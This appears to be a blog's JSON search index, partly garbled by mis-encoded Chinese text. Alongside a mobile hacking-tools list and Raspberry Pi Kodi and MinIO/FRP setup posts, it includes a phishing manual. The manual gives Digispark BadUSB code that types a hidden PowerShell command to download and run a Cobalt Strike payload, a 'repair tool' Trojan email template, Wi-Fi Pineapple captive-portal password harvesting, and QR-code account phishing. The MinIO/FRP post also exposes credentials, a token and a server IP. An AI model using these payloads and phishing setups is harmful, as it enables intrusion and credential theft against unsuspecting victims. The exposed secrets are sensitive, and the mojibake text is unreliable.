ï¼ˆç»å…¸æ¼æ´åˆ©ç”¨æ¡†æ¶ï¼Œæ˜¯ä½ ä»æ‰‹æœºå‘ä¸–ç•Œå‘èµ·æ”»å‡»çš„ä¸äºŒé€‰æ‹©ï¼ˆç¬‘ï¼‰ï¼‰ Nmap ï¼ˆè€ç‰Œæ‰«æå™¨ï¼Œç°åœ¨ä»æ˜¯ä¸€æŠŠå¥½æ‰‹ï¼‰ Sqlmap ï¼ˆæ•°æ®åº“æ³¨å…¥ç¥å™¨ï¼‰ ettercap ï¼ˆå±€åŸŸç½‘ARPæ¬ºéª—å·¥å…·ï¼‰ wifite ï¼ˆç»å…¸æ— çº¿æ”»å‡»å·¥å…·ï¼Œçˆ†ç ´wifiå¯†ç ç­‰ï¼‰ kaliä¸Šå·¥å…·å¤ªå¤šäº†ï¼Œç”¨è¿‡çš„è‡ªç„¶çŸ¥é“æ‰‹æœºç‰ˆçš„kaliæœ‰å¤šimbaï¼Œå”¯ä¸€çš„ç¡¬ä¼¤å°±æ˜¯â€œæ‰‹æœºçš„å¤„ç†é€Ÿåº¦â€ï¼Œä¸è¿‡ç‘•ä¸æ©ç‘œ Nethuner ï¼ˆKali Nethunterè‡ªå®¶ç³»ç»Ÿé›†æˆçš„è½¯ä»¶ï¼ŒåŠŸèƒ½ä¸°å¯Œï¼‰ MAC Changerï¼ˆæ›´æ”¹å¯¹å¤–æ˜¾ç¤ºçš„è®¾å¤‡MACåœ°å€ï¼‰ DuckHunter HID ï¼ˆå°†è‡ªå·±çš„æ‰‹æœºæ¨¡æ‹Ÿä¸ºä¸€ä¸ªbadusbï¼Œé€šè¿‡æ•°æ®çº¿æ’å…¥è®¾å¤‡å³å¯é€ æˆå±å®³ï¼‰ Pineapple Connector ï¼ˆWifi Pineappleè¿æ¥å™¨ï¼Œç›¸å½“äºç®€åŒ–äº†ä»æµè§ˆå™¨ç›´è¿ï¼Œå¦‚æœä¹°çš„æ˜¯æŸå®çš„å›½äº§å¤§è èåˆšå¥½èƒ½ç”¨ä¸Šï¼Œå¦‚æœä¹°çš„æ˜¯å®˜æ–¹è èæ´¾ï¼Œå»ºè®®ä½¿ç”¨google playä¸Šäººå®¶è‡ªå®¶çš„è½¯ä»¶ï¼‰ DeAuth ï¼ˆæµé‡æ´ªæ°´æ”»å‡»ï¼‰ AndRax ï¼ˆä¹Ÿæ˜¯ä¸€ä¸ªé›†æˆäº†å„ç§æ¸—é€å·¥å…·çš„æ¡†æ¶ï¼Œå½“åˆFreebuffä¸€æ¨é€æˆ‘å°±ç›´æ¥å»å®˜ç½‘ä¸‹è½½äº†åˆç‰ˆï¼Œä¸è¿‡ä¸ªäººç”¨çš„ä¸å¤šï¼‰ Xposedæ¡†æ¶ ï¼ˆè¿™ä¸ªå¿…é¡»è¦æï¼Œå¾ˆå¤šç©æœºçš„å‘çƒ§å‹å¾ˆå–œæ¬¢åœ¨è¿™ä¸ªä¸Šé¢åšæ–‡ç« ï¼Œé…·å®‰ä¸Šæœ‰ä¸€å¤§å †æ¨¡å—ï¼‰ï¼Œæ¯”æ–¹è¯´æˆ‘ä»¬å¯ä»¥ï¼š qq/å¾®ä¿¡ç§’æŠ¢çº¢åŒ… æ‰‹æœºçŠ¶æ€æ ç­‰å„ç§å¥‡å¦™ç¾åŒ– æ›´ç‰›é€¼çš„æ€åå°åº”ç”¨ è¿™æ˜¯ä¸€ä¸ªç©æœºçš„æ·±å‘â€¦â€¦. æˆ‘æ˜¯èŒèŒå“’çš„åˆ†å‰²çº¿ 0x02.å¤–æŒ‚ç›¸å…³è™½è¯´ä¸åªæ˜¯å•å•ä¸€éƒ¨æ‰‹æœºäº†ï¼Œä½†æ˜¯åœ¨è¿™é‡Œä»‹ç»ä¸€äº›ä»¥æ‰‹æœºä½œä¸ºä¸»ä½“è€Œå‘å¤–æ‰©å±•çš„å¤–æŒ‚ åˆ†çº¿å™¨ã€è½¬æ¥çº¿ ï¼ˆå¿…å¤‡ï¼Œè‡ªä¾›ç”µé‚£ç§æœ€å¥½ï¼Œæ‰‹æœºçš„ä¸€ä¸ªæ’çº¿å£è¿‡äºé™åˆ¶æˆ‘ä»¬é»‘å®¢çš„æƒ³è±¡åŠ›ï¼ˆç¬‘ï¼‰ï¼‰ TP-LINK TL-WN722N ï¼ˆé€‚é…kaliçš„æ— çº¿ç½‘å¡ï¼Œå¦‚æœä½ è¦ä½¿ç”¨wifiteï¼Œè¿™ä¸ªå¿…å¤‡ï¼‰ Wifi Pineapple ï¼ˆwifiå¤§è èï¼Œä¸€ä¸ªè¯æè¿°å°±æ˜¯â€œç‰›é€¼â€ï¼Œæƒ³è¦å›¾å½¢é¡µé¢ç›´æ¥åœ¨æ‰‹æœºæµè§ˆå™¨è¾“å…¥ipå°±å¯è®¿é—®ï¼Œå¦‚æœé’Ÿçˆ±å‘½ä»¤è¡Œï¼Œä¸å¦¨å°è¯•ï¼šâ€œJuiceSSH+å¤§è èâ€ï¼‰ æ— çº¿é”®ç›˜ ï¼ˆæ‰‹æœºä¸Šçš„å±å¹•é”®ç›˜å§‹ç»ˆè¿˜æ˜¯ä¸æ–¹ä¾¿ï¼Œé¢„ç®—å……è¶³å°±ä¹°è“ç‰™çš„ï¼ˆç½—æŠ€é‚£æ¬¾ï¼Œ100+ï¼‰ï¼Œä¸è¶³å°±åœ¨æŸå®ä¹°é£é¼ é”®ç›˜ï¼ˆ30-40rmbï¼‰ï¼‰ å…¶ä»–å·¥å…·ï¼Œä¸æ‰‹æœºè”åˆæ‰“ç»„åˆæ‹³ï¼ˆè¦ä¸æ˜¯åœ¨æ‰‹æœºä¸Šsshï¼Œæœ‰çº¿è¿æ¥ï¼Œè¦ä¸å°±æ˜¯å®˜æ–¹æœ‰æ‰‹æœºç‰ˆappï¼‰ æ ‘è“æ´¾ ï¼ˆä¸å¤šè¯´äº†ï¼Œç”¨æ‰‹æœºsshè¿ä¸Šèƒ½åšçš„äº‹æƒ…å¤ªå¤šï¼‰ Proxmark3/4 ï¼ˆåŸºäºRFIDçš„å—…æ¢ã€å…‹éš†ç­‰æ“ä½œï¼Œå¯ç”¨äºç ´è§£ID/UIDç­‰å¡ç‰‡ï¼‰ PocketChip ï¼ˆä¸€ä¸ªæˆ‘è‡ªå·±æ¯”è¾ƒå–œæ¬¢çš„Linuxå°ç©å…·ï¼‰ Hackcube ï¼ˆ360æ— çº¿ç”µç ”ç©¶é™¢æçš„ä¾¿æºå¼ç¡¬ä»¶å¹³å°ï¼‰ Badusb/USB Ninja ï¼ˆæˆ–è€…åœˆå†…å°ç«é¾™å¤§ä½¬è‡ªå·±æå¾—hackusbï¼‰ æˆ‘æ˜¯èŒèŒå“’çš„åˆ†å‰²çº¿ 0x03.é»‘å®¢æƒ…æ€€ç›¸å…³â€œé»‘å®¢ä¹Ÿæ˜¯å¯»å¸¸äººâ€ï¼ˆç¬‘ï¼‰ï¼Œä»¥ä¸‹ç½—åˆ—ä¸€äº›å…¶ä»–æå®‰å…¨å¿…çŸ¥å¿…å¤‡çš„è½¯ä»¶ é€šè¿‡æ‰‹æœºè·å–å®‰å…¨èµ„è®¯ Telegram ï¼ˆå³â€œç”µæŠ¥â€ï¼Œé™¤äº†äº›å¥‡å¥‡æ€ªæ€ªçš„channelï¼ˆé€ƒï¼‰ï¼Œæœ‰äº›èµ„æºï¼Œå¤§ä½¬çš„åšå®¢åœ¨è¿™ä¸ªä¸Šé¢éƒ½å¯ä»¥æ‰¾åˆ°ï¼Œæ¯”æ–¹è¯´ï¼šä½™å¼¦å¤§ä½¬çš„â€œç°è¢æ¨é€â€ï¼‰ Twitter ï¼ˆæå®‰å…¨ï¼Œç¼ºä¸äº†ä¸å›½é™…æ¥è½¨ï¼Œå¾ˆå¤š0dayæˆ–æ˜¯å›½å¤–å¤§ç‰›çš„å¥½æ–‡ç« éƒ½ä¼šåœ¨è¿™ä¸Šåˆ†äº«ï¼Œåªæ˜¯æ¯”è¾ƒè€ƒéªŒè‹±è¯­æ°´å¹³ï¼‰ Feedly ï¼ˆå¦‚æœä½ å—ä¸äº†çŸ­å¹³å¿«çš„ç¢ç‰‡åŒ–ä¿¡æ¯ï¼Œåœ¨Feedlyä¸Šè®¢é˜…ä¸€äº›å¤§ä½¬çš„åšå®¢ä¸å¤±ä¸ºä¸€ä¸ªå¥½ä¹ æƒ¯ï¼ˆè™½ç„¶ç°åœ¨æœ‰äº›åŠŸèƒ½éœ€è¦èŠ±é’±è®©æˆ‘å¾ˆä¸çˆ½ï¼‰ï¼‰ Ins ï¼ˆå¦‚æœä½ å–œçˆ±é»‘å®¢æ–‡åŒ–ï¼Œåœ¨è¿™ä¸ªä¸Šé¢ä½ ç»å¯¹èƒ½æ‰¾åˆ°å¾ˆå¤šéå¸¸æœ‰åˆ›æ„çš„é»‘å®¢æ–‡åŒ–å…ƒç´ ï¼‰ é€šè¿‡æ‰‹æœºçœ‹å®‰å…¨è§†é¢‘ Youtube ï¼ˆå¼€ç©ç¬‘å‘¢ï¼ŒBlackhatã€Defconã€Hak5å„ç§é¢‘é“éƒ½èšé›†åœ¨æ­¤ï¼Œæ€ä¹ˆèƒ½å°‘å¾—äº†è¿™æ¬¾è½¯ä»¶ï¼‰ bilibili ï¼ˆä½œä¸ºæ–°ä¸–çºªçš„ä¼˜ç§€é’å¹´ï¼Œä½ åº”è¯¥æ•é”çš„å‘è§‰ï¼šå›½å†…å¾ˆå¤šå®‰å…¨å›¢é˜Ÿçš„å†…éƒ¨åŸ¹è®­è§†é¢‘éå¸¸å–œæ¬¢ä¸Šä¼ bç«™ï¼Œä»¥åŠbç«™çš„ç›´æ’­ï¼‰ iæ˜¥ç§‹ ï¼ˆè™½ç„¶æ‰‹æœºç‰ˆä½“éªŒä¹Ÿå°±é‚£æ ·ï¼Œä¸è¿‡ä»æ˜¯ä¸€ä¸ªä¸é”™çš„å®‰å…¨å­¦ä¹ å¹³å°ï¼‰ æœ€åï¼Œæ”¾ä¸Šæˆ‘çš„æƒ…æ€€é»‘è“é•‡æ¥¼ï¼š","link":"/2020/05/27/%E9%BB%91%E5%AE%A2%E6%89%8B%E6%9C%BA/"},{"title":"ä½¿ç”¨ Raspberry Pi æ­å»º Kodi å®¶åº­å½±é™¢","text":"ä¸‹è½½kodi1sudo apt install kodi é…ç½®kodiè‡ªå¯åŠ¨ é…ç½®æœåŠ¡1sudo vim /lib/systemd/system/kodi.service å¹¶è¾“å…¥ä»¥ä¸‹å†…å®¹ 12345678910111213[Unit]Description = Kodi Media CenterAfter = remote-fs.target network-online.targetWants = network-online.target[Service]Type = simpleExecStart = /usr/bin/kodi-standaloneRestart = on-abortRestartSec = 5[Install]WantedBy = multi-user.target åˆ·æ–°sytemctlï¼Œå¹¶å¯ç”¨ç›¸å…³æœåŠ¡ 12345sudo systemctl-reloadsudo systemctl start kodisudo systemctl enable kodi# å¯ä»¥æŸ¥çœ‹æœåŠ¡å™¨å¯åŠ¨æƒ…å†µsudo systemctl status kodi ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ï¼Œè¾¾åˆ°æ‰“å¼€ç”µè§†è‡ªåŠ¨å¯åŠ¨kodi 1kodi &gt;/dev/null 2&gt;&amp;1 &amp; é…ç½®HDMIå¼ºåˆ¶çƒ­æ’æ‹”å¦‚æœä¸é…ç½®è¿™ä¸ªé€‰é¡¹ï¼Œé‚£ä¹ˆåªæœ‰å½“æ ‘è“æ´¾å¯åŠ¨çš„æ—¶å€™æ‰ä¼šæ£€æµ‹hdmiä¿¡æ¯ï¼Œè¾¾ä¸åˆ°å¼€ç”µè§†å³å¯çœ‹çš„æ•ˆæœä¿®æ”¹ 1sudo vim /boot/config.txt å°†å…¶ä¸­å¦‚ä¸‹è¡Œçš„æ³¨é‡Šç¬¦å»æ‰ 1hdmi_force_hotplug=1 ä½¿ç”¨kodiä½¿ç”¨å†…ç½‘æ–‡ä»¶å…±äº« Macä¸Š ç³»ç»Ÿåå¥½è®¾ç½®-ç”¨æˆ·å’Œç»„-æ·»åŠ ä¸€ä¸ªæ–°çš„ç”¨æˆ·ï¼ˆç”¨æˆ·å/å¯†ç ï¼‰ ç³»ç»Ÿåå¥½è®¾ç½®-é€šç”¨-å…±äº«-æ‰“å¼€æ–‡ä»¶å…±äº«å¹¶ä¸”æ‰“å¼€å³è¾¹çš„ä¿¡æ¯ï¼Œé…ç½®å…·ä½“å…±äº«çš„æ–‡ä»¶å¤¹ï¼ŒåŠå…±äº«äºº Windowsä¸Š WIndowså¯é€‰åŠŸèƒ½ä¸­ï¼Œæ·»åŠ â€œSMB 1.0â€çš„åŠŸèƒ½ å¯¹æƒ³è¦å…±äº«çš„æ–‡ä»¶å¤¹ï¼Œè®¾ç½®é«˜çº§å…±äº«å³å¯ é…ç½®å¥½å…±äº«åï¼Œå¯ä»¥åœ¨kodiä¸­æ·»åŠ è§†é¢‘ é…ç½®æ’ä»¶IPTV12# ä¸‹è½½kodi-pvr-iptvsimplesudo apt install kodi-pvr-iptvsimple åˆ®å‰Šå™¨kodiè‡ªå¸¦çš„æœ¬èº«åˆ®å‰Šå™¨å°±å¾ˆå¥½ç”¨ï¼Œä¸ç®¡æ˜¯ç”µå½±è¿˜æ˜¯å‰§é›†å‡å–è‡ªäºåœ¨çº¿ç½‘ç«™ï¼šThe Movie Database (TMDB) åœ¨kodié…ç½®å¥½ä»£ç†çš„æƒ…å†µä¸‹ï¼Œæ·»åŠ æ–‡ä»¶ä¾¿å¯è‡ªåŠ¨ä½¿ç”¨åˆ®å‰Šå™¨å¯¹ç”µå½±çš„ä¿¡æ¯è¿›è¡Œåœ¨çº¿é‡‡é›†ï¼Œä½†æ˜¯ç”µå½±çš„æ–‡ä»¶åéœ€è§„èŒƒåŒ– ä¸ç®¡æ˜¯ç”µå½±ï¼ˆMoviesï¼‰è¿˜æ˜¯å‰§é›†ï¼ˆTV Episodeï¼‰ï¼Œæ–‡ä»¶åå‡éœ€è¦å»TMDBä¸Šçœ‹å·²æœ‰çš„ç”µå½±åæ˜¯æ€ä¹ˆè§„èŒƒåŒ–ä¹¦å†™çš„ï¼ŒåŒæ—¶æ³¨æ„åŠ ä¸Šå¹´ä»½ã€‚ä¾‹å¦‚æœ¬å‰§ï¼Œåˆ™éœ€è¦å†™æˆâ€œ***æµ´è¡€é»‘å¸®(2013)***â€ å¦‚æœæ˜¯å‰§é›†ï¼Œé‚£ä¹ˆæ–‡ä»¶ç»“æ„æœ€å¥½æ˜¯è§„èŒƒåŒ–çš„å‰§é›†å-å­£åˆ†ç±»ä¿¡æ¯-æ¯ä¸€é›†çš„ä¿¡æ¯å­£åˆ†ç±»ä¿¡æ¯æœ€å¥½æ˜¯â€œSeason 1, Season 2â€åˆ†é›†ä¿¡æ¯æœ€å¥½åŒ…å«***è§„èŒƒåŒ–çš„S(Season)åŠE(Episode)***â€œxxxx.S01E02.xxx-xxx.mp4â€ å¦‚æœæ–‡ä»¶åæ˜¯ä¸­æ–‡ï¼Œkodiçš„æ’ä»¶è„šæœ¬ä¼šè‡ªåŠ¨è·å–TMDBä¸Šè¯¥ç”µå½±/å‰§é›†çš„ä¸­æ–‡ä¿¡æ¯ï¼Œå¦‚æœæƒ³è·å–è‹±æ–‡ä¿¡æ¯ï¼ŒåŒç†éœ€è¦æŠŠæ–‡ä»¶åæŒ‰è§„èŒƒæ”¹ä¸ºè‹±æ–‡å å¦‚æœå‘ç°æŸäº›å­£/é›†åœ¨TMDBä¸Šæ²¡æœ‰ï¼Œé‚£ä¹ˆå¯ä»¥åœ¨TMDBä¸Šæ³¨å†Œä¸€ä¸ªè´¦å·ï¼Œè‡ªå·±æ¥æ·»åŠ  å¦‚æœæ˜¯åœ¨ä¸åŒç½‘æ®µä¸‹å¼€å¯è·¯ç”±å™¨çš„APæ¨¡å¼ï¼ˆæœ‰çº¿ä¸­ç»§ï¼‰è¿™æ—¶å€™chen-2.4å°±å’Œchen4åœ¨åŒä¸€ä¸ªç½‘æ®µä¸‹äº†ï¼ŒåŒæ—¶wifiè¿˜äº’ä¸å¹²æ‰°åˆ†åˆ«è®¾ç½®æ ‘è“æ´¾å’Œç”µè„‘çš„é™æ€IPå¦‚æœpingä¸é€šï¼Œå¾ˆæœ‰å¯èƒ½æ˜¯windowsé˜²ç«å¢™æ²¡æœ‰è®¾ç½®å¥½å¯ä»¥åœ¨windowsé˜²ç«å¢™ä¸­ï¼Œè®¾ç½® SMB æ–‡ä»¶å…±äº« V2ray V2rayN xrayçš„é€šè¿‡ç­–ç•¥ ä»¥pingé€šä¸ºå‡†å¦‚æœwindowsçš„ipå˜åŒ–äº†ï¼Œè®°å¾—æ›´æ”¹ç”µå½±/å‰§é›†çš„è§†é¢‘æº+ä»£ç†ä¿¡æ¯","link":"/2022/12/09/%E6%A0%91%E8%8E%93%E6%B4%BE%E6%90%AD%E5%BB%BA%E5%AE%B6%E5%BA%AD%E5%BD%B1%E9%99%A2/"},{"title":"ä½¿ç”¨ Raspberry Pi è‡ªå»º MinIO å›¾åºŠ","text":"åœ¨æœåŠ¡å™¨/æ ‘è“æ´¾æ­å»ºMinIOæˆ‘ä½¿ç”¨çš„å›¾åºŠä¸ºMinIOï¼Œå¯ä»¥ä½¿ç”¨dockerä¸€é”®æ­å»ºå…¶ä¸­è´¦å·å’Œå¯†ç å‡åœ¨å…¶ä¸­ 1234567891011docker run \\ -p 9000:9000 \\ -p 9001:9001 \\ --name minio1 \\ -v /data/minio/data:/data \\ -v /data/minio/config:/root/.minio \\ -e &quot;MINIO_ROOT_USER=IHCVodsfa23jsksssv12&quot; \\ -e &quot;MINIO_ROOT_PASSWORD=IUH2ioh23xxIid33&quot; \\ -e MINIO_SERVER_URL=http://localhost:9000 \\ quay.io/minio/minio server /data \\ --address &quot;:9000&quot; --console-address &quot;:9001&quot; \\ è®¾ç½®å¯åŠ¨dockerä¾¿è‡ªå¯åŠ¨å®¹å™¨ 1docker update --restart=always minio1 ä½¿ç”¨æ ‘è“æ´¾è¿›è¡ŒFRPå†…ç½‘ç©¿é€åœ¨æœåŠ¡å™¨ç«¯æ­å»ºfrpsæŒ‰ç…§æœåŠ¡å™¨æ¶æ„åœ¨githubä¸Šä¸‹è½½frpåŒ…ï¼ŒæœåŠ¡å™¨ç«¯æˆ‘ä»¬åªä¼šç”¨åˆ°frpså’Œfrps.ini é…ç½®frps.ini 123[common]bind_port = 7000token = xii21n12noci è¿™é‡Œçš„commonç«¯å£å³ä¸ºfrpçš„é€šä¿¡ç«¯å£ï¼Œéœ€ä¸å®¢æˆ·ç«¯ä¿æŒä¸€è‡´tokenå¯ä¸ºé€šä¿¡è¿›è¡ŒåŠ å¯†ï¼Œéœ€ä¸å®¢æˆ·ç«¯ä¿æŒä¸€è‡´ åœ¨å®¢æˆ·ç«¯æ­å»ºfrpcåŒç†æŒ‰ç…§å®¢æˆ·ç«¯æ¶æ„åœ¨githubä¸Šä¸‹è½½frpåŒ…ï¼Œå®¢æˆ·ç«¯æˆ‘ä»¬åªä¼šç”¨åˆ°frpcå’Œfrpc.ini é…ç½®frpc.ini 1234567891011[common]server_addr = 120.48.17.251server_port = 7000token = xii21n12noci[picgo]type = tcplocal_ip = 127.0.0.1local_port = 9000remote_port = 9000#è®¿é—®è¿œç¨‹çš„9000å³è®¿é—®æœ¬åœ°çš„9000 commonä¸­çš„ server_addr éœ€ä¸ºfrpsæœåŠ¡å™¨çš„åœ°å€ç«¯å£å’Œtokenéœ€ä¸æœåŠ¡å™¨ä¿æŒä¸€è‡´ ä¸‹æ–¹ä¸ºè¿æ¥æœåŠ¡ï¼Œ local_ip å’Œ local_port ä»£è¡¨ç€æœ¬åœ°ipåŠç«¯å£ï¼Œremote_ip ä»£è¡¨ç€æœåŠ¡å™¨çš„ç«¯å£ï¼Œæ„æ€å³ä¸ºï¼šå½“è®¿é—®æœåŠ¡å™¨çš„9000ç«¯å£æ—¶ï¼Œå°†TCPæµé‡è½¬å‘è‡³127.0.0.1:9000ï¼ˆæœ¬åœ°çš„9000ç«¯å£ï¼‰ ç½®frpc/frpsæœåŠ¡å™¨å¼€æœºè‡ªå¯æ–°å»ºsystemctlæ–‡ä»¶ï¼Œç³»ç»Ÿè‡ªå¯è¿›ç¨‹åè‡ªè¡Œæ›´æ”¹ 1sudo vim /lib/systemd/system/frpc.service å†™å…¥ 12345678910111213[Unit]Description=frpcAfter=multi-user.target[Service]TimeoutStartSec=10RestartSec=30sRestart=alwaysExecStart=/usr/bin/frpc -c /etc/frpc.iniExecStop=/bin/kill $MAINPID[Install]WantedBy=multi-user.target ç„¶åå¯åŠ¨ç›¸å…³æœåŠ¡å³å¯ 12345678# æ›´æ–°æœåŠ¡æ–‡ä»¶sudo systemctl daemon-reload# å¼€å¯sudo systemctl start frpc# è®¾ç½®å¼€æœºå¯åŠ¨sudo systemctl enable frpc# æŸ¥çœ‹çŠ¶æ€sudo systemctl status frpc","link":"/2022/12/07/%E6%A0%91%E8%8E%93%E6%B4%BE%E8%87%AA%E5%BB%BA%E5%9B%BE%E5%BA%8A/"},{"title":"Four Fishing Scenes Demo Manual","text":"# BadUSB Fishing CS releasedBadUSB Fishing CS releasedUse the tool Digispark , shaped like a USB memory stick, and use the Arduino compilation to burn programs into it. Install Arduino debugging software Open the Arduino website Arduino - Home and click Software. Download the Windows version of the software (the one that says Win7 or newer on the right) to install Install the software, which will prompt you to install a USB drive, click Install The installation is successful as shown in the following figure Configuring Digispark in the Arduino board In Additional Board Manager URLs, add:1https://raw.githubusercontent.com/ArminJo/DigistumpArduino/master/package_digistump_index.json Click Development Edition Management, and search for digistump , you can find this development version configuration information, install this Digistump AVR Boards Click Development Boards - &gt; Digistump AVR Boards - &gt; Digispark (Default - 16.5mhz) Upload program Upload the program you want to execute, enter the code you want to upload, and click the right arrow to upload (the one on the left is verification, uploading includes the steps of verification) When uploading, it will let you save the program in one place, save it in one place at will. Case 1: Pop-up NotepadIf you want to pop-up notepad, burn the following program: 123456789101112#include &quot;DigiKeyboard.h&quot;void setup() { DigiKeyboard.delay(500); DigiKeyboard.sendKeyStroke(KEY_R,MOD_GUI_LEFT); delay(500); DigiKeyboard.println(&quot;notepad&quot;); delay(500); DigiKeyboard.sendKeyStroke(KEY_ENTER);}void loop(){} Case 2: CS releaseWhere xxxx is the CobaltStrike HTTP release address 1234567891011121314#include &lt;DigiKeyboardFr.h&gt;void setup() { DigiKeyboard.delay(5000); DigiKeyboard.sendKeyStroke(KEY_R,MOD_GUI_LEFT); DigiKeyboard.delay(500); DigiKeyboard.sendKeyStroke(KEY_CAPSLOCK); DigiKeyboard.delay(500); DigiKeyboard.println(&quot;powershell.exe -nop -w hidden -c 'IEX ((new-object net.webclient).downloadstring('xxxx'))'&quot;); DigiKeyboard.sendKeyStroke(KEY_ENTER); DigiKeyboard.sendKeyStroke(KEY_CAPSLOCK);}void loop(){} Insert Digispark to release it~ Mail phishing CS releaseEmail contentEmail content (this requires the user to write a paragraph): Recently, there has been a xx vulnerability. The company contacted the xx manufacturer to provide a xx vulnerability repair tool. Please be sure to open it for repairDownload the repair tool:xxxx And you can put a Trojan File into this phishing mail~ Wi-Fi Pineapple Wi-Fi Phishing information collectionStart pineapple pie, install 4 net cables and plug in power Start the pineapple pie Connect to the pineapple pie management WIFI Open the browser and visit the pineapple pie management address: 172.16.42.1:1471, You can access the administrative address of Wifi Pineapple Configure network bridging (networking pineapple pie)The purpose of this operation is to logically: Victim -&gt; Pineapple pie -&gt; Internet The network structure allows the victim to connect to the pineapple pieâ€™s phishing wifi and still be able to access the Internet, but the victim does not know that there is a pineapple pie between him and the Internet (When you click scan to scan the wifi, you can click several times until you scan the available wifi) Phishing with the Evil Portal plugin Then the victim will search for your phishing wifi SSID in his WIFI, and a pop-up window will appear on the landing page Enter the password and you will be phished~ If you want to make changes to the phishing pageWhen you have bridged the pineapple pie to the network, the pineapple pie itself can connect to the external network Connect to the pineapple pie management address just created, use XSHELL or the command line ssh connection tool, use ssh to log in to the pineapple pie terminal. After successful login, the display looks like this. Use the command to enter the port-xxxx directory(The filepath of your phishing website) 1cd portals/xxxx/ You can see the relevant web files, just modify them~ How to check phishing passwordsLog in to the backend of pineapple pie and enter the portal/xxxx folderThe password is stored in the pwd.txt file QR code fishing information collectionLet the victim directly scan the QR code, you can pop up the pop-up window of the QQ Zone (just for demonstration, modify its front-end page to make it more simulation), the victim fills in the account password, you can receive the information filled in at the server level, resulting in information leakage Build your own QR code phishing server receiverVisit github for a detailed build tutorial:GitHub - Resek4/QQFishing: QQé’“é±¼ï¼Œç¤¾ä¼šå·¥ç¨‹ Set up this service on your own server (you need to install docker-compose in advance), and then execute the following commands in sequence: 123git clone https://github.com/Cl0udG0d/QQFishingcd QQFishingdocker-compose up -d After setting up, access the server http://IP:5000 to access its phishing address Generate QR codeBaidu casually search for a QR code generation online tool that can embed pictures, such as:å…è´¹åœ¨çº¿äºŒç»´ç ç”Ÿæˆå™¨ Generate the phishing URL as a QR code, and the victim can scan the QR code to achieve the purpose of opening the phishing page, such as(This QR code is just an example, users need to regenerate it themselves)","link":"/2022/07/15/Four%20Fishing%20Scenes%20Demo%20Manual/"}],"tags":[],"categories":[{"name":"HackStyle","slug":"HackStyle","link":"/categories/HackStyle/"},{"name":"TechLearning","slug":"TechLearning","link":"/categories/TechLearning/"},{"name":"Toolkit","slug":"Toolkit","link":"/categories/Toolkit/"},{"name":"Penetration","slug":"Penetration","link":"/categories/Penetration/"}]}